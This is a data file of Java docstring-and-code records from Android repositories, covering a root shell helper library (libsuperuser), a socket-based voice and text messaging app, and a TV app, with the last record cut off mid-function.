{"docstring": "/**\n * <p>\n * Wait for idle state. As this is a blocking call, you should not call\n * it from the main UI thread. If you do so and debug mode is enabled,\n * this method will intentionally crash your app.\n * </p>\n * <p>\n * If not interrupted, this method will not return until all commands\n * have finished executing. Note that this does not necessarily mean\n * that all the callbacks have fired yet.\n * </p>\n * <p>\n * If no Handler is used, all callbacks will have been executed when\n * this method returns. If a Handler is used, and this method is called\n * from a different thread than associated with the Handler's Looper,\n * all callbacks will have been executed when this method returns as\n * well. If however a Handler is used but this method is called from the\n * same thread as associated with the Handler's Looper, there is no way\n * to know.\n * </p>\n * <p>\n * In practice this means that in most simple cases all callbacks will\n * have completed when this method returns, but if you actually depend\n * on this behavior, you should make certain this is indeed the case.\n * </p>\n * <p>\n * See {@link eu.chainfire.libsuperuser.Shell.Interactive} for further details on threading and\n * handlers\n * </p>\n * \n * @return True if wait complete, false if wait interrupted\n */\n", "func_signal": "public boolean waitForIdle()", "code": "{\n    if (Debug.getSanityChecksEnabledEffective() && Debug.onMainThread()) {\n        Debug.log(ShellOnMainThreadException.EXCEPTION_WAIT_IDLE);\n        throw new ShellOnMainThreadException(ShellOnMainThreadException.EXCEPTION_WAIT_IDLE);\n    }\n\n    if (isRunning()) {\n        synchronized (idleSync) {\n            while (!idle) {\n                try {\n                    idleSync.wait();\n                } catch (InterruptedException e) {\n                    return false;\n                }\n            }\n        }\n\n        if ((handler != null) &&\n                (handler.getLooper() != null) &&\n                (handler.getLooper() != Looper.myLooper())) {\n            // If the callbacks are posted to a different thread than\n            // this one, we can wait until all callbacks have called\n            // before returning. If we don't use a Handler at all, the\n            // callbacks are already called before we get here. If we do\n            // use a Handler but we use the same Looper, waiting here\n            // would actually block the callbacks from being called\n\n            synchronized (callbackSync) {\n                while (callbacks > 0) {\n                    try {\n                        callbackSync.wait();\n                    } catch (InterruptedException e) {\n                        return false;\n                    }\n                }\n            }\n        }\n    }\n\n    return true;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>\n * Runs commands using the supplied shell, and returns the output, or null\n * in case of errors.\n * </p>\n * <p>\n * Note that due to compatibility with older Android versions, wantSTDERR is\n * not implemented using redirectErrorStream, but rather appended to the\n * output. STDOUT and STDERR are thus not guaranteed to be in the correct\n * order in the output.\n * </p>\n * <p>\n * Note as well that this code will intentionally crash when run in debug\n * mode from the main thread of the application. You should always execute\n * shell commands from a background thread.\n * </p>\n * <p>\n * When in debug mode, the code will also excessively log the commands\n * passed to and the output returned from the shell.\n * </p>\n * <p>\n * Though this function uses background threads to gobble STDOUT and STDERR\n * so a deadlock does not occur if the shell produces massive output, the\n * output is still stored in a List&lt;String&gt;, and as such doing\n * something like <em>'ls -lR /'</em> will probably have you run out of\n * memory.\n * </p>\n * \n * @param shell The shell to use for executing the commands\n * @param commands The commands to execute\n * @param environment List of all environment variables (in 'key=value'\n *            format) or null for defaults\n * @param wantSTDERR Return STDERR in the output ?\n * @return Output of the commands, or null in case of an error\n */\n", "func_signal": "public static List<String> run(String shell, String[] commands, String[] environment,\n        boolean wantSTDERR)", "code": "{\n    String shellUpper = shell.toUpperCase(Locale.ENGLISH);\n\n    if (Debug.getSanityChecksEnabledEffective() && Debug.onMainThread()) {\n        // check if we're running in the main thread, and if so, crash if\n        // we're in debug mode, to let the developer know attention is\n        // needed here.\n\n        Debug.log(ShellOnMainThreadException.EXCEPTION_COMMAND);\n        throw new ShellOnMainThreadException(ShellOnMainThreadException.EXCEPTION_COMMAND);\n    }\n    Debug.logCommand(String.format(\"[%s%%] START\", shellUpper));\n\n    List<String> res = Collections.synchronizedList(new ArrayList<String>());\n\n    try {\n        // Combine passed environment with system environment\n        if (environment != null) {\n            Map<String, String> newEnvironment = new HashMap<String, String>();\n            newEnvironment.putAll(System.getenv());\n            int split;\n            for (String entry : environment) {\n                if ((split = entry.indexOf(\"=\")) >= 0) {\n                    newEnvironment.put(entry.substring(0, split), entry.substring(split + 1));\n                }\n            }\n            int i = 0;\n            environment = new String[newEnvironment.size()];\n            for (Map.Entry<String, String> entry : newEnvironment.entrySet()) {\n                environment[i] = entry.getKey() + \"=\" + entry.getValue();\n                i++;\n            }\n        }\n\n        // setup our process, retrieve STDIN stream, and STDOUT/STDERR\n        // gobblers\n        Process process = Runtime.getRuntime().exec(shell, environment);\n        DataOutputStream STDIN = new DataOutputStream(process.getOutputStream());\n        StreamGobbler STDOUT = new StreamGobbler(shellUpper + \"-\", process.getInputStream(),\n                res);\n        StreamGobbler STDERR = new StreamGobbler(shellUpper + \"*\", process.getErrorStream(),\n                wantSTDERR ? res : null);\n\n        // start gobbling and write our commands to the shell\n        STDOUT.start();\n        STDERR.start();\n        try {\n            for (String write : commands) {\n                Debug.logCommand(String.format(\"[%s+] %s\", shellUpper, write));\n                STDIN.write((write + \"\\n\").getBytes(\"UTF-8\"));\n                STDIN.flush();\n            }\n            STDIN.write(\"exit\\n\".getBytes(\"UTF-8\"));\n            STDIN.flush();\n        } catch (IOException e) {\n            if (e.getMessage().contains(\"EPIPE\")) {\n                // method most horrid to catch broken pipe, in which case we\n                // do nothing. the command is not a shell, the shell closed\n                // STDIN, the script already contained the exit command, etc.\n                // these cases we want the output instead of returning null\n            } else {\n                // other issues we don't know how to handle, leads to\n                // returning null\n                throw e;\n            }\n        }\n\n        // wait for our process to finish, while we gobble away in the\n        // background\n        process.waitFor();\n\n        // make sure our threads are done gobbling, our streams are closed,\n        // and the process is destroyed - while the latter two shouldn't be\n        // needed in theory, and may even produce warnings, in \"normal\" Java\n        // they are required for guaranteed cleanup of resources, so lets be\n        // safe and do this on Android as well\n        try {\n            STDIN.close();\n        } catch (IOException e) {\n        }\n        STDOUT.join();\n        STDERR.join();\n        process.destroy();\n\n        // in case of su, 255 usually indicates access denied\n        if (SU.isSU(shell) && (process.exitValue() == 255)) {\n            res = null;\n        }\n    } catch (IOException e) {\n        // shell probably not found\n        res = null;\n    } catch (InterruptedException e) {\n        // this should really be re-thrown\n        res = null;\n    }\n\n    Debug.logCommand(String.format(\"[%s%%] END\", shell.toUpperCase(Locale.ENGLISH)));\n    return res;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>\n * Set a custom handler that will be used to post all callbacks to\n * </p>\n * <p>\n * See {@link eu.chainfire.libsuperuser.Shell.Interactive} for further details on threading and\n * handlers\n * </p>\n * \n * @param handler Handler to use\n * @return This Builder object for method chaining\n */\n", "func_signal": "public Builder setHandler(Handler handler)", "code": "{\n    this.handler = handler;\n    return this;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Detect if SELinux is set to enforcing, caches result\n * \n * @return true if SELinux set to enforcing, or false in the case of\n *         permissive or not present\n */\n", "func_signal": "public static synchronized boolean isSELinuxEnforcing()", "code": "{\n    if (isSELinuxEnforcing == null) {\n        Boolean enforcing = null;\n\n        // First known firmware with SELinux built-in was a 4.2 (17)\n        // leak\n        if (android.os.Build.VERSION.SDK_INT >= 17) {\n            // Detect enforcing through sysfs, not always present\n            if (enforcing == null) {\n                File f = new File(\"/sys/fs/selinux/enforce\");\n                if (f.exists()) {\n                    try {\n                        InputStream is = new FileInputStream(\"/sys/fs/selinux/enforce\");\n                        try {\n                            enforcing = (is.read() == '1');\n                        } finally {\n                            is.close();\n                        }\n                    } catch (Exception e) {\n                    }\n                }\n            }\n\n            // 4.4+ builds are enforcing by default, take the gamble\n            if (enforcing == null) {\n                enforcing = (android.os.Build.VERSION.SDK_INT >= 19);\n            }\n        }\n\n        if (enforcing == null) {\n            enforcing = false;\n        }\n\n        isSELinuxEnforcing = enforcing;\n    }\n    return isSELinuxEnforcing;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Runs command as root (if available) and return output\n * \n * @param command The command to run\n * @return Output of the command, or null if root isn't available or in\n *         case of an error\n */\n", "func_signal": "public static List<String> run(String command)", "code": "{\n    return Shell.run(\"su\", new String[] {\n            command\n    }, null, false);\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Set shell binary to use. Usually \"sh\" or \"su\", do not use a full path\n * unless you have a good reason to\n * \n * @param shell Shell to use\n * @return This Builder object for method chaining\n */\n", "func_signal": "public Builder setShell(String shell)", "code": "{\n    this.shell = shell;\n    return this;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Add or update an environment variable\n * \n * @param key Key of the environment variable\n * @param value Value of the environment variable\n * @return This Builder object for method chaining\n */\n", "func_signal": "public Builder addEnvironment(String key, String value)", "code": "{\n    environment.put(key, value);\n    return this;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * \u5f00\u59cb\u5f55\u97f3\n * @param listener \u53d1\u751f\u5f02\u5e38\u7684\u56de\u8c03\u4e8b\u4ef6\n */\n", "func_signal": "public void startRecord(OnRecordErrorListener listener)", "code": "{\n\tif(mRecorder == null){\n\t\tmRecorder = new MediaRecord();\n\t\tmRecorder.setOnErrorListener(listener);\n\t}\n\tmRecorder.start();\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u505c\u6b62\u64ad\u653e\uff0c\u5728activity/fragment onPause()\u65b9\u6cd5\u4e2d\u8c03\u7528\n */\n", "func_signal": "public void stopPlay()", "code": "{\n\tif(mPlayer != null){\n\t\tmPlayer.stop();\n\t}\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u91ca\u653e\u64ad\u653e\u8d44\u6e90\uff0c\u5728activity/fragment onStop()\u65b9\u6cd5\u4e2d\u8c03\u7528\n */\n", "func_signal": "public void releasePlay()", "code": "{\n\tif(mPlayer != null){\n\t\tmPlayer.release();\n\t\tmPlayer = null;\n\t}\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u53d1\u9001\u6587\u4ef6\u5904\u7406\n * @param dos\n */\n", "func_signal": "private void doSend(DataOutputStream dos)", "code": "{\n\tif (dos == null) {\n\t\treturn;\n\t}\n\n\tif (newSendRequest()) {\n\t\tString name = latestEntity.fileName;\n\t\tLog.i(TAG, \"doSend() -> new file name: \" + name);\n\t\t\n\t\tFile file = new File(latestEntity.filePath);\n\t\tif(!file.exists()){\n\t\t\treturn;\n\t\t}\n\n\t\tFileInputStream reader = null;\n\t\tbyte[] buf = null;\n\t\t\n\t\ttry {\n\t\t\t// 1. \u8bfb\u53d6\u6587\u4ef6\u8f93\u5165\u6d41\n\t\t\treader = new FileInputStream(file);\n\t\t\t// 2. \u5c06\u6587\u4ef6\u5185\u5bb9\u5199\u5230Socket\u7684\u8f93\u51fa\u6d41\u4e2d\n\t\t\t// out.writeInt(UPLOAD);\n\t\t\tLog.i(TAG, \"doSend() -> before writeUTF()\");\n\t\t\tdos.writeUTF(name);\n\t\t\tLog.i(TAG, \"doSend() -> after writeUTF()\");\n\t\t\tdos.flush();\n\t\t\tdos.writeLong(file.length());\n\t\t\tdos.flush();\n\t\t\tdos.writeInt(latestEntity.time);\n\t\t\tdos.flush();\n\n\t\t\tint bufferSize = 20480; // 20K\n\t\t\tbuf = new byte[bufferSize];\n\t\t\tint read = 0;\n\t\t\t// \u5c06\u6587\u4ef6\u8f93\u5165\u6d41 \u5faa\u73af \u8bfb\u5165 Socket\u7684\u8f93\u51fa\u6d41\u4e2d\n\t\t\twhile ((read = reader.read(buf, 0, buf.length)) != -1) {\n\t\t\t\tdos.write(buf, 0, read);\n\t\t\t}\n//\t\t\t\tdos.write(null);\n\t\t\tLog.i(TAG, \"socket\u6267\u884c\u5b8c\u6210\");\n\t\t\tdos.flush();\n//\t\t\t\tmSocket.shutdownOutput();\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} finally {\n\t\t\ttry {\n\t\t\t\tif (reader != null) {\n\t\t\t\t\treader.close();\n\t\t\t\t}\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t}\n\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\socket\\FileHandlerSocket.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u63a5\u6536\u6587\u4ef6\u5904\u7406\n * @param dis\n */\n", "func_signal": "private void doReceive(DataInputStream dis)", "code": "{\n\tif (dis == null) {\n\t\treturn;\n\t}\n\tLog.i(TAG, \"doReceive()\");\n\tBufferedOutputStream fo = null;\n\n\ttry {\n\t\tLog.i(TAG, \"doReceive() -> before readUTF()\");\n\t\tVoiceMsgEntity entity = new VoiceMsgEntity();\n\t\t// \u6587\u4ef6\u540d\n\t\tentity.fileName = dis.readUTF();\n\t\t\n\t\tLog.i(TAG, \"doReceive() -> after readUTF()\");\n\n\t\t// \u5b58\u50a8\u8def\u5f84\n\t\tif (TextUtils.isEmpty(entity.fileName)) {\n//\t\t\t\tfileName = System.currentTimeMillis() + \"\";\n\t\t\tLog.e(TAG, \"run() -> name is null\");\n\t\t\treturn;\n\t\t}\n\t\t\n\t\tLog.i(TAG, \"run() -> \u6587\u4ef6\u540d: \" + entity.fileName);\n\t\t\n\t\tentity.size = dis.readLong();\n\t\tif(entity.size <= 0){\n\t\t\tLog.e(TAG, \"run() -> \u6587\u4ef6\u5927\u5c0f\u4e3a0\");\n\t\t\treturn;\n\t\t}\n\t\tLog.i(TAG, \"run() -> \u6587\u4ef6\u5927\u5c0f: \" + entity.size);\n\t\t\n\t\tentity.time = dis.readInt();\n\t\t\n\t\tentity.filePath = CommonUtil.getAmrFilePath(entity.fileName);\n\n\t\tLog.i(TAG, \"run() -> \u4fdd\u5b58\u8def\u5f84\uff1a\" + entity.filePath);\n\t\t// \u521b\u5efa\u76ee\u5f55\n\t\tCreateDir(entity.filePath);\n\n\t\t// 2\u3001\u5c06\u6570\u636e\u6d41\u5199\u5230\u6587\u4ef6\u4e2d\n\t\tfo = new BufferedOutputStream(new FileOutputStream(new File(\n\t\t\t\tentity.filePath)));\n\n\t\tint bytesRead = 0;\n\t\tbyte[] buffer = new byte[2048];\n\t\tint writeLens = 0;\n\t\twhile ((bytesRead = dis.read(buffer, 0, buffer.length)) != -1) {\n\t\t\twriteLens += bytesRead;\n\t\t\tLog.i(TAG, \"doReceive() -> \u63a5\u6536\u6587\u4ef6\u5b8c\u6210\uff0c\u6587\u4ef6\u957f\u5ea6\uff1a\" + writeLens);\n\t\t\tfo.write(buffer, 0, bytesRead);\n\t\t\t//\u5982\u679c\u6587\u4ef6\u8bfb\u53d6\u5b8c\uff0c\u9000\u51fa\u5faa\u73af\uff0c\u907f\u514d\u963b\u585e\n\t\t\tif(writeLens >= entity.size){\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tfo.flush();\n\t\t\n\t\tLog.i(TAG, \"doReceive() -> \u6570\u636e\u63a5\u6536\u5b8c\u6bd5\");\n\n\t\tEventBus.getDefault().post(entity);\n\n\t} catch (FileNotFoundException e) {\n\t\te.printStackTrace();\n\t} catch (IOException e) {\n//\t\t\te.printStackTrace();\n\t\tLog.i(TAG, \"doReceive() -> IOException error\");\n\t} finally {\n\t\ttry {\n\t\t\tif (fo != null) {\n\t\t\t\tfo.close();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\socket\\FileHandlerSocket.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u83b7\u53d6\u5f55\u97f3\u65f6\u97f3\u91cf\u632f\u5e45\u7ea7\u522b\n * \n * @return\n */\n", "func_signal": "public int getAmplitudeLevel()", "code": "{\n\tint level = 0;\n\tif(mRecorder != null){\n\t\tlevel = mRecorder.getAmplitudeLevel();\n\t}\n\treturn level;\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u505c\u6b62\u5f55\u97f3\n */\n", "func_signal": "public void stopRecord()", "code": "{\n\tif(mRecorder != null){\n\t\tmRecorder.stop();\n\t}\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u505c\u6b62\u64ad\u653e\uff0c\u5728activity/fragment onPause()\u65b9\u6cd5\u4e2d\u8c03\u7528\n */\n", "func_signal": "public void stopPlay()", "code": "{\n\tif(mPlayer != null){\n\t\tmPlayer.stop();\n\t}\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u53d1\u9001\u6587\u672c\u6d88\u606f\n * @param entity\n */\n", "func_signal": "private void doTextSend(TextMsgEntity entity, SendCallback callback)", "code": "{\n\tif (mDataOutputStream == null || entity == null || TextUtils.isEmpty(entity.msgContent)) {\n\t\treturn;\n\t}\n\t\n\tLog.i(TAG, \"send to client: \" + entity.msgContent);\n\ttry {\n\t\t\n\t\tbyte[] buffer = entity.msgContent.getBytes();\n\t\t\n\t\t//\u5199\u5165\u7c7b\u578b\uff1a\u6587\u672c\n\t\tmDataOutputStream.writeInt(MsgEntity.TYPE_TEXT);\n\t\tmDataOutputStream.flush();\n\t\t\n\t\tmDataOutputStream.writeInt(buffer.length);\n\t\tmDataOutputStream.flush();\n\t\t\n\t\tmDataOutputStream.write(buffer);\n\t\tmDataOutputStream.flush();\n\t\t\n\t\tif(callback != null){\n\t\t\tcallback.onFinish();\n\t\t}\n\t\t\n\t} catch (IOException e) {\n//\t\t\te.printStackTrace();\n\t\t\n\t\tif(callback != null){\n\t\t\tcallback.onError();\n\t\t}\n\t}\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\socket\\MsgSendHandler.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u5f00\u59cb\u5f55\u97f3\n * @param listener \u53d1\u751f\u5f02\u5e38\u7684\u56de\u8c03\u4e8b\u4ef6\n */\n", "func_signal": "public void startRecord(OnRecordErrorListener listener)", "code": "{\n\tif(mRecorder == null){\n\t\tmRecorder = new MediaRecord();\n\t\tmRecorder.setOnErrorListener(listener);\n\t}\n\tmRecorder.start();\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u53d1\u751f\u5f02\u5e38\u5904\u7406\n * @param msg\n */\n", "func_signal": "private void onError(String msg)", "code": "{\n\t\n\tif (mOnRecordErrorListener != null) {\n\t\tmOnRecordErrorListener.onError(msg);\n\t}\n\t\n\tmPath = null;\n\t\n\tmIsRecoding = false;\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaRecord.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u53c2\u6570\u521d\u59cb\u5316\n */\n", "func_signal": "private void init() throws Exception", "code": "{\n\trecorder.reset();\n\trecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\n\trecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);\n\trecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);\n\trecorder.setAudioSamplingRate(SAMPLE_RATE_IN_HZ);\n\trecorder.setOutputFile(mPath);\n\trecorder.setOnErrorListener(new OnErrorListener() {\n\t\t\n\t\tpublic void onError(MediaRecorder mr, int what, int extra) {\n\t\t\tMediaRecord.this.onError(\"\u5f55\u97f3\u5f02\u5e38\");\n\t\t}\n\t});\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaRecord.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u83b7\u53d6\u97f3\u9891\u6587\u4ef6\u8def\u5f84\n * @return\n */\n", "func_signal": "public String getRecordFilePath()", "code": "{\n\tif(mRecorder != null){\n\t\treturn mRecorder.getOutputPath();\n\t}\n\treturn null;\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u83b7\u53d6\u5f55\u97f3\u65f6\u97f3\u91cf\u632f\u5e45\u7ea7\u522b\n * \n * @return\n */\n", "func_signal": "public int getAmplitudeLevel()", "code": "{\n\tint level = 0;\n\tif(mRecorder != null){\n\t\tlevel = mRecorder.getAmplitudeLevel();\n\t}\n\treturn level;\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u53d1\u9001\u6587\u4ef6\u5904\u7406\n * \n * @param dos\n */\n", "func_signal": "private void doFileSend(VoiceMsgEntity entity, SendCallback callback)", "code": "{\n\tif (mDataOutputStream == null || entity == null) {\n\t\treturn;\n\t}\n\n\tString name = entity.fileName;\n\tLog.i(TAG, \"doSend() -> new file name: \" + name);\n\n\tFile file = new File(entity.filePath);\n\tif (!file.exists()) {\n\t\treturn;\n\t}\n\n\tFileInputStream reader = null;\n\tbyte[] buf = null;\n\n\ttry {\n\t\t\n\t\t//\u5199\u5165\u7c7b\u578b\uff1a\u8bed\u97f3\n\t\tmDataOutputStream.writeInt(MsgEntity.TYPE_VOICE);\n\t\tmDataOutputStream.flush();\n\t\t\n\t\t// 1. \u8bfb\u53d6\u6587\u4ef6\u8f93\u5165\u6d41\n\t\treader = new FileInputStream(file);\n\t\t// 2. \u5c06\u6587\u4ef6\u5185\u5bb9\u5199\u5230Socket\u7684\u8f93\u51fa\u6d41\u4e2d\n\t\t// out.writeInt(UPLOAD);\n\t\tLog.i(TAG, \"doSend() -> before writeUTF()\");\n\t\tmDataOutputStream.writeUTF(name);\n\t\tLog.i(TAG, \"doSend() -> after writeUTF()\");\n\t\tmDataOutputStream.flush();\n\t\tmDataOutputStream.writeLong(file.length());\n\t\tmDataOutputStream.flush();\n\t\tmDataOutputStream.writeInt(entity.time);\n\t\tmDataOutputStream.flush();\n\n\t\tint bufferSize = 20480; // 20K\n\t\tbuf = new byte[bufferSize];\n\t\tint read = 0;\n\t\t// \u5c06\u6587\u4ef6\u8f93\u5165\u6d41 \u5faa\u73af \u8bfb\u5165 Socket\u7684\u8f93\u51fa\u6d41\u4e2d\n\t\twhile ((read = reader.read(buf, 0, buf.length)) != -1) {\n\t\t\tmDataOutputStream.write(buf, 0, read);\n\t\t}\n\t\tLog.i(TAG, \"socket\u6267\u884c\u5b8c\u6210\");\n\t\tmDataOutputStream.flush();\n\t\t\n\t\tif(callback != null){\n\t\t\tcallback.onFinish();\n\t\t}\n\t\t\n\t\treader.close();\n\t\t\n\t}  catch (IOException e) {\n//\t\t\te.printStackTrace();\n\t\t\n\t\tif(callback != null){\n\t\t\tcallback.onError();\n\t\t}\n\t} \n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\socket\\MsgSendHandler.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u5f00\u59cb\u64ad\u653e\n * @param source \u97f3\u9891\u6587\u4ef6\u8def\u5f84\n * @param listener \u56de\u8c03\u4e8b\u4ef6\n */\n", "func_signal": "public void startPlay(String source, OnPlayCallbackListener listener)", "code": "{\n\tif(mPlayer == null){\n\t\tmPlayer = new MediaPlay();\n\t\tmPlayer.setOnPlayCallbackListener(listener);\n\t}\n\t\n\tmPlayer.start(source);\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u91ca\u653e\u5f55\u97f3\u8d44\u6e90\uff0c\u5728activity/fragment onStop()\u65b9\u6cd5\u4e2d\u8c03\u7528\n */\n", "func_signal": "public void releaseRecord()", "code": "{\n\tif(mRecorder != null){\n\t\tmRecorder.release();\n\t\tmRecorder = null;\n\t}\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u91ca\u653e\u5f55\u97f3\u8d44\u6e90\uff0c\u5728activity/fragment onStop()\u65b9\u6cd5\u4e2d\u8c03\u7528\n */\n", "func_signal": "public void releaseRecord()", "code": "{\n\tif(mRecorder != null){\n\t\tmRecorder.release();\n\t\tmRecorder = null;\n\t}\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "// \u521b\u5efa\u76ee\u5f55\uff08\u4e0d\u5b58\u5728\u5219\u521b\u5efa\uff09\n", "func_signal": "public File CreateDir(String dir)", "code": "{\n\tLog.i(TAG, \"CreateDir()\");\n\tFile file = new File(dir);\n\tif (!file.getParentFile().exists()) {\n\t\tfile.getParentFile().mkdirs();\n\t}\n\treturn file;\n}", "path": "IMClient\\src\\com\\jimmy\\im\\client\\socket\\FileHandlerSocket.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/**\n * \u505c\u6b62\u5f55\u97f3\n */\n", "func_signal": "public void stopRecord()", "code": "{\n\tif(mRecorder != null){\n\t\tmRecorder.stop();\n\t}\n}", "path": "IMServer\\src\\com\\jimmy\\im\\server\\media\\MediaWrapper.java", "repo_name": "keshuangjie/Android-Socket", "stars": 71, "license": "None", "language": "java", "size": 784}
{"docstring": "/*\n/**********************************************************\n/* Fluent factories for changing match settings\n/**********************************************************\n */\n", "func_signal": "public DataFormatReaders withOptimalMatch(MatchStrength optMatch)", "code": "{\n    if (optMatch == _optimalMatch) {\n        return this;\n    }\n    return new DataFormatReaders(_readers, optMatch, _minimalMatch, _maxInputLookahead);\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/** Called when the activity is first created. */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n\tsuper.onCreate(savedInstanceState);\n\tsetContentView(R.layout.main);\n\n\tapp = (App) getApplicationContext();\n\taq = new AQuery(this);\n\t\n//\t\tMobclickAgent.onError(this);\n\t\n\n\tstartingImageView = (ImageView) findViewById(R.id.image_starting);\n\t\n\tif(!UtilTools.getIsShowAd(getApplicationContext())) {\n\t\t\n\t\tBitmapFactory.Options opt = new BitmapFactory.Options();\n//\t\t\t  opt.inPreferredConfig = Bitmap.Config.RGB_565; // Each pixel is stored 2 bytes\n\t  // opt.inPreferredConfig = Bitmap.Config.ARGB_8888; //Each pixel is stored 4 bytes\n//\n\t\topt.inTempStorage = new byte[16 * 1024];\n//\t\t\topt.inPurgeable = true;\n//\t\t\topt.inInputShareable = true;\n//\t\t\t\n\t\ttry {\n\t\t\tstartingImageView.setImageBitmap(BitmapFactory.decodeResource(getResources(), R.drawable.starting, opt));\n\t\t} catch (OutOfMemoryError e1) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te1.printStackTrace();\n\t\t}\n\t} else {\n\t\t\n\t\tshowDialog(DIALOG_WAITING);\n\t}\n\t\n\trootLayout = (RelativeLayout) findViewById(R.id.root_layout);\n\tgallery1 = (CustomGallery) findViewById(R.id.gallery);\n\tcontentLayout = (LinearLayout) findViewById(R.id.contentlayout);\n\tnoticeView = (TextView) findViewById(R.id.notice_text);\n\ttitleGroup = (MyScrollLayout) findViewById(R.id.group);\n\ttitleGroup.setFocusable(false);\n\ttitleGroup.setFocusableInTouchMode(false);\n\n\timage_bar1 = (ImageView) findViewById(R.id.img_navagatorbar1);\n\timage_bar2 = (ImageView) findViewById(R.id.img_navagatorbar2);\n\timage_bar3 = (ImageView) 